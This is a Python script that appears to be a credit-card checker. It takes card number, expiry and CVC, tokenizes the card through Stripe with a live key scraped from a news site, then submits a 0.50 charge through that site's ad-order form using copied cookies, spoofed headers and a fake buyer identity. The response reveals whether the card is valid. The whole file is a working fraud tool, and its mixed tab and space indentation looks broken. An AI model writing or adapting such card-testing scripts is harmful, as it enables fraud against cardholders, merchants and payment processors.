import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F44098e0890%3B+stripe-js-v3%2F44098e0890%3B+card-element&referrer=https%3A%2F%2Fnews.dpgazette.com&time_on_page=74526&key=pk_live_51Ozkr9P3o1jZ9Xie1YDNdVUOtcjO80GY4I825jJlYcPmvWZk1GhHloRVAtEFHsM6f7NqTbNv6Tlx2jbi5ANsjjWl00mcNhcCSK'
    
    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    pm = r1.json()['id']
    
    cookies = {
        'advanced_ads_pro_visitor_referrer': '%7B%22expires%22%3A1768249261%2C%22data%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%7D',
        '_gcl_au': '1.1.2097762215.1736713263',
        '_ga': 'GA1.1.1871403871.1736713263',
        '_pk_id.31.ba30': 'b59dc5848978a83e.1736713264.',
        'advanced_ads_visitor': '%7B%22vc_cache_reset%22%3A0%7D',
        '__stripe_mid': 'f8fb9aed-b2d1-4d3d-b8db-a0ded74736d7542aa2',
        'fluentform_step_form_hash_9': 'c333db6a-1fd7-45a9-9fb7-1bd345a3cc6e',
        'advanced_ads_page_impressions': '%7B%22expires%22%3A2052073261%2C%22data%22%3A3%7D',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-01-12%2020%3A55%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_first_add': 'fd%3D2025-01-12%2020%3A55%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F',
        '_ga_99ZLQ6952B': 'GS1.1.1736715306.2.0.1736715306.60.0.0',
        '_pk_ref.31.ba30': '%5B%22%22%2C%22%22%2C1736715307%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.31.ba30': '1',
        'tu-geoip-ajax': '%7B%22city%22%3A%22Bangkok%22%2C%22state%22%3A%22Bangkok%22%2C%22country%22%3A%22Thailand%22%7D',
        'tu-geoip-hide': 'true',
        'FCNEC': '%5B%5B%22AKsRol8lllJNn2-Fk0-dBfZ4n3xyMnmK3dIA2y-jpIT_l3OBsefqddWpxRNEdZee3V_nVaESXBYTo5ta39FSzRVCJIbp-Xe95Lz3yvntV3kcixKFGJ-j8VYH8sZZhAOSYMl-dkT1emVZOxJQ6WuXFo01M7Tn-S1n4w%3D%3D%22%5D%5D',
        '__stripe_sid': '9aff9de5-ce93-4dc9-839b-e40ff0bb3a441a5323',
    }
    
    headers = {
        'authority': 'news.dpgazette.com',
        'accept': '*/*',
        'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'advanced_ads_pro_visitor_referrer=%7B%22expires%22%3A1768249261%2C%22data%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%7D; _gcl_au=1.1.2097762215.1736713263; _ga=GA1.1.1871403871.1736713263; _pk_id.31.ba30=b59dc5848978a83e.1736713264.; advanced_ads_visitor=%7B%22vc_cache_reset%22%3A0%7D; __stripe_mid=f8fb9aed-b2d1-4d3d-b8db-a0ded74736d7542aa2; fluentform_step_form_hash_9=c333db6a-1fd7-45a9-9fb7-1bd345a3cc6e; advanced_ads_page_impressions=%7B%22expires%22%3A2052073261%2C%22data%22%3A3%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-12%2020%3A55%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-01-12%2020%3A55%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnews.dpgazette.com%2Forder-display-ads%2F; _ga_99ZLQ6952B=GS1.1.1736715306.2.0.1736715306.60.0.0; _pk_ref.31.ba30=%5B%22%22%2C%22%22%2C1736715307%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.31.ba30=1; tu-geoip-ajax=%7B%22city%22%3A%22Bangkok%22%2C%22state%22%3A%22Bangkok%22%2C%22country%22%3A%22Thailand%22%7D; tu-geoip-hide=true; FCNEC=%5B%5B%22AKsRol8lllJNn2-Fk0-dBfZ4n3xyMnmK3dIA2y-jpIT_l3OBsefqddWpxRNEdZee3V_nVaESXBYTo5ta39FSzRVCJIbp-Xe95Lz3yvntV3kcixKFGJ-j8VYH8sZZhAOSYMl-dkT1emVZOxJQ6WuXFo01M7Tn-S1n4w%3D%3D%22%5D%5D; __stripe_sid=9aff9de5-ce93-4dc9-839b-e40ff0bb3a441a5323',
        'origin': 'https://news.dpgazette.com',
        'referer': 'https://news.dpgazette.com/order-display-ads/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {
        't': '1736715380878',
    }
    
    data = {
        'data': '__fluent_form_embded_post_id=14843&_fluentform_9_fluentformnonce=fccf744204&_wp_http_referer=%2Forder-display-ads%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&phone=%2B12084359362&rangeslider=1&checkbox%5B%5D=Leaderboard%20Ad%20Group%20%2430%2FMonth&rangeslider_1=1&numeric-field_1=55&description=&url=&email_1=&custom-payment-amount=0.50&payment_method=stripe&terms-n-condition=on&terms-n-condition_1=on&item__9__fluent_checkme_=&input_radio=&__stripe_payment_method_id='+str(pm)+'',
        'action': 'fluentform_submit',
        'form_id': '9',
    }
    
    r2 = requests.post(
        'https://news.dpgazette.com/wp-admin/admin-ajax.php',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )

	return (r2.json())
